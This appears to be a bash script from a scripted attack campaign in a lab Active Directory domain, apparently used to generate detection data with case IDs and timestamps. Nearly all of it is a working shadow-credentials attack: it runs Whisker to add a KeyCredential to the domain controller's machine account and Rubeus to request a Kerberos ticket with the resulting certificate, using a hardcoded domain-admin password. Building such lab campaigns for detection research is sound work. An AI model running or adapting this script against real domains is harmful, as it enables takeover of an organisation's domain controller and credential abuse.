#!/usr/bin/env bash
# T008 — Shadow credentials from ws01 as chief_command (cadre.local DA)
# Adds a new KeyCredential to dc01$ and requests TGT via Rubeus.
# Entry credential: chief_command (earned via Branch A T015 ForceChangePassword)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T008-SHADOW-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T008 Shadow credentials | ${CASE_ID} | T0=${T0} ==="

DOMAIN_ROOT="${DOMAIN_ROOT:-cadre.local}"
DC01="${DC01:-dc01.cadre.local}"
TARGET_USER="dc01$"

CMD='
$w = "C:\Tools\cadre-attack\Whisker.exe";
$r = "C:\Tools\cadre-attack\Rubeus.exe";
if (-not (Test-Path $w)) { throw "Whisker.exe not found" }
if (-not (Test-Path $r)) { throw "Rubeus.exe not found" }
& $w add /target:"'''"${TARGET_USER}"'''" /domain:"'''"${DOMAIN_ROOT}"'''" /dc:"'''"${DC01}"'''";
Write-Output "T008_OK: shadow credentials added for '''"${TARGET_USER}"'''";
& $r asktgt /user:"'''"${TARGET_USER}"'''" /domain:"'''"${DOMAIN_ROOT}"'''" /dc:"'''"${DC01}"'''" /certificate:C:\Users\chief_command\AppData\Local\Temp\Whisker_*.pfx /password:WhiskerPassword123 /nowrap
'

ws01_exec_as chief_command 'C0mm@nd_Ch1ef!' "$CMD" 'cadre.local'

cadre_export "${CASE_ID}" T008 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T008 run complete ==="
